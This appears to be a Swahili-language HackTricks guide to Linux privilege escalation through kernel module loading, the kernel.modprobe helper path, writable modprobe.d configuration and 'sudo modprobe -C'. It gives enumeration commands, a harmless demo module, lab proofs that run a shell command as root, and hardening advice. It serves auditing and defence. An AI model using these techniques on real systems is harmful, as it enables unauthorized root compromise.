# Unyanyasaji wa Kernel Modules na modprobe

{{#include ../../banners/hacktricks-training.md}}

## Mipangilio mibaya ya kernel module na upakiaji wa module

Usaidizi wa kernel module ni eneo lenye athari kubwa wakati wa ukaguzi wa Linux privilege escalation. Usichukulie kila ujumbe wa module zisizosainiwa kuwa unaweza kutumiwa vibaya peke yake, bali uutumie kujibu maswali ya kiutendaji.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Je, mtumiaji wa sasa anaweza kupakia modules kupitia `sudo`, capabilities, au njia ya helper inayoweza kuandikwa?
- Je, upakiaji wa module bado umewezeshwa?
- Je, utekelezaji wa sahihi za module umezimwa?
- Je, directories za module, mafaili ya module, au njia za usanidi za `modprobe.d` zinaweza kuandikwa?<sup>[[16]](#references)</sup>
- Je, logi za kernel zinaweza kusomwa ili kuthibitisha kilichotokea?

Uchunguzi wa awali huanza na ukaguzi ufuatao wa hali ya module, sahihi, logging, na mti wa modules.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Interpretation:

- `modules_disabled=1` inamaanisha modules haziwezi kupakiwa wala kuondolewa, na thamani hiyo haiwezi kuwekwa tena kuwa `0` hadi mfumo uanzishwe upya.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` kwenye mstari wa amri wa kernel au `CONFIG_MODULE_SIG_FORCE=y` huhitaji modules zilizotiwa sahihi kihalali; la sivyo, modules zisizo na sahihi zinaweza kupakiwa na kuutia kernel alama ya taint.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` haiweki kizuizi chochote kwa `dmesg`; ikiwa ni `1`, ufikiaji unahitaji `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Njia zinazoweza kuandikwa zilizo chini ya `/lib/modules/$(uname -r)/` ni hatari kwa sababu `modprobe` hutafuta kwenye mti huo na data yake ya dependencies wakati wa kupakia modules.<sup>[[8]](#references)</sup>

### Kupakia module na kusoma kernel output

Ikiwa una ruhusa halali ya kupakia local module, `insmod` huingiza faili halisi ya `.ko` unayotoa. Init function ya module huendeshwa kama sehemu ya upakiaji, na ujumbe unaoandikwa kwa `printk()` huenda kwenye kernel log buffer, ambayo kwa kawaida husomwa kwa `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Workflow ndogo ya ukaguzi hutumia `modinfo` kuchunguza metadata, `insmod` na `rmmod` kupakia na kuondoa module, `lsmod` kuthibitisha hali ya upakiaji, na `dmesg` kuchunguza kernel logs.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ikiwa `sudo -l` inaruhusu `insmod`, `modprobe`, au wrapper inayozizunguka, ichukulie kama critical: `sudo -l` huorodhesha privileges za mtumiaji anayeendesha amri, na kupakia kernel module kunahitaji `CAP_SYS_MODULE`. Tazama [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) kwa njia za moja kwa moja zinazotegemea capability.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Sheria ya sudo inayomruhusu mtumiaji kuendesha `insmod` haiwezi kulinganishwa na kumruhusu kutumia helper wa kawaida wa kiutawala. Msimbo wa uanzishaji wa module huendeshwa wakati wa kuingizwa, hivyo swali la msingi katika ukaguzi ni ikiwa mtumiaji huyu anaweza kuchagua au kurekebisha module inayopakiwa.<sup>[[3]](#references)</sup>

Mtiririko wa jumla wa ukaguzi ulio hapa chini hurudia ukaguzi wa inspection, upakiaji, hali, log, na uondoaji kwa module inayolengwa.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ikiwa mtumiaji anaweza kutoa `.ko` yoyote, sheria hiyo inapaswa kuchukuliwa kuwa **full system compromise** katika tathmini iliyoidhinishwa. Mchoro salama zaidi wa kiutendaji ni kuepuka kukabidhi upakiaji wa module kupitia sudo; ikiwa haiwezi kuepukika, zuia path kamili, umiliki, permissions, signing policy na workflow ya uondoaji.<sup>[[3]](#references)[[10]](#references)</sup>

Kwa mchoro usio na madhara wa kutengeneza module katika lab inayodhibitiwa, source na Makefile ndogo zinaonyeshwa hapa chini; muundo wa `make -C /lib/modules/$(uname -r)/build M=$PWD` unafuata workflow iliyoandikwa ya kernel ya kbuild kwa external modules.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Jenga na upakie tu katika labu iliyoidhinishwa; kbuild hujenga module ya nje, na amri za load/remove huita interfaces za kernel module.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### `kernel.modprobe` / `modprobe_path` abuse checks

`kernel.modprobe` hutaja userspace helper anayetekelezwa na kernel kwa ajili ya maombi ya module autoload; sysctl hii huathiri autoloading, si uingizaji wa module ulioombwa moja kwa moja. Ikiwa attacker anaweza kuibadilisha iwe njia ya executable inayoweza kuandikwa na kisha kuchochea ombi la module, helper huyo huwa njia ya privileged code-execution. Kuiweka kuwa string tupu huzima maombi ya autoload; ikiwa `CONFIG_STATIC_USERMODEHELPER=y`, thamani isiyo tupu hubatilishwa na njia ya static helper iliyojengwa wakati wa compilation.<sup>[[1]](#references)</sup>

Kagua njia ya sasa ya helper kupitia interface ya kernel sysctl na uchunguze umiliki na mode ya target.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Kagua ikiwa sysctl, delegated sudo rules, au file capabilities zinaweza kuathiriwa.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Pattern hii ya maabara pekee hubadilisha njia ya helper na kuanzisha ombi lililoandikwa la module-autoload; itumie tu kwenye mfumo uliotengwa na ulioidhinishwa.<sup>[[1]](#references)</sup>

Kwenye Linux kernels za sasa, usitumie executable isiyojulikana kama trigger ya jumla: legacy custom binary-format module autoloading iliondolewa katika Linux 6.14, huku nyaraka za kernel zikitaja unknown filesystem type kama njia ya ombi la module-autoload.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Kwenye mifumo iliyoimarishwa, hii inapaswa kushindikana wakati ruhusa zinapozuia uandishi wa watumiaji wasio na privileges kwenye `kernel.modprobe`, njia ya helper haiwezi kuandikwa, au module autoloading imezimwa.<sup>[[1]](#references)</sup>

### Usanidi wa `modprobe.d` unaoweza kuandikwa na `sudo modprobe -C`

Kabla ya kutatua module, `modprobe` husoma faili za `.conf` kutoka kwenye saraka za usanidi kama vile `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, na `/lib/modprobe.d`, kwa mpangilio wa precedence. Faili yenye jina lilelile katika saraka yenye priority ya juu huficha faili iliyo katika saraka yenye priority ya chini. Muhimu zaidi, directive ya `install <module> <command>` huendesha shell command kiholela **badala ya** kuingiza module hiyo. Kwa hivyo, njia ya usanidi inayoweza kuandikwa inaweza kuwa command execution iliyocheleweshwa chini ya credentials za mtumiaji wa baadaye aliye na privileges anayeendesha `modprobe`; kernel module signature enforcement hai-authenticate command hii ya userspace.<sup>[[16]](#references)</sup>

Kagua ruhusa za saraka na faili, kisha chunguza usanidi unaotumika. `modprobe -n -v` ni salama kwa ukaguzi wa resolution kwa sababu dry-run mode haiingizi module wala kuendesha command ya `install`/`remove`. Pendelea `modprobe -c` badala ya uandishi wa zamani wa `--showconfig`, ambao nyaraka za sasa za kmod zinaashiria utaondolewa baada ya kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
[ -e "$d" ] || continue
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
/etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
/usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```
Sheria ya sudo isiyowekewa vikwazo kwa `modprobe` inaweza kutumiwa vibaya hata wakati faili za kiholela za `.ko` haziwezi kupita uthibitishaji wa sahihi: `-C` huchagua directory ya configuration inayodhibitiwa na mshambuliaji, ambapo amri ya `install` inaweza kutekelezwa na mchakato ulioanzishwa na sudo.<sup>[[8]](#references)[[16]](#references)</sup>
```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```
Kwa mitigation, usitoe `modprobe` yenye arguments zisizo na vizuizi kupitia sudo, hakikisha kila configuration directory inamilikiwa na root na haiwezi kuandikwa, na kagua directives za `install`/`remove` zisizotarajiwa. Wakati workflow ya kuaminika ya kiutawala lazima ipuuze directives kama hizo kwa module moja, `modprobe --ignore-install` huzipuuza kwa module iliyotajwa, lakini dependencies bado zinaweza kuwa na commands zao wenyewe.<sup>[[8]](#references)[[16]](#references)</sup>

### Mapitio ya `/lib/modules` inayoweza kuandikwa

Module directories zinazoweza kuandikwa zinaweza kuruhusu kubadilishwa kwa modules, kupandikizwa kwa modules hasidi, au matumizi mabaya ya auto-load kulingana na jinsi `modprobe` itakavyoitishwa baadaye; `modprobe` hutafuta `/lib/modules/$(uname -r)` na hutumia dependency data yake wakati wa kutatua modules.<sup>[[8]](#references)</sup>

Kagua module files zinazoweza kuandikwa pamoja na dependency/alias metadata chini ya module tree ya kernel release inayotumika.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ukikuta maudhui ya module yanayoweza kuandikwa, chunguza jinsi `modprobe` inavyotatua dependencies na jinsi `modinfo` inavyoripoti metadata ya module.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Maelezo ya kujilinda:

- Weka `/lib/modules` iwe inamilikiwa na `root:root` na isiweze kuandikwa na users.<sup>[[8]](#references)</sup>
- Weka `kernel.modules_disabled=1` baada ya boot pale inapowezekana kiutendaji.<sup>[[1]](#references)</sup>
- Tekeleza module signing kwenye systems zinazohitaji loadable modules.<sup>[[2]](#references)</sup>
- Fuatilia uandishi kwenye `/proc/sys/kernel/modprobe`, `/lib/modules`, na directories za configuration za `modprobe.d`, pamoja na utekelezaji usiotarajiwa wa `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## References

- [1] [Documentation for /proc/sys/kernel/ — Nyaraka za Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing facility — Nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver Basics — Nyaraka za Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Message logging with printk — Nyaraka za Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Building External Modules — Nyaraka za Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
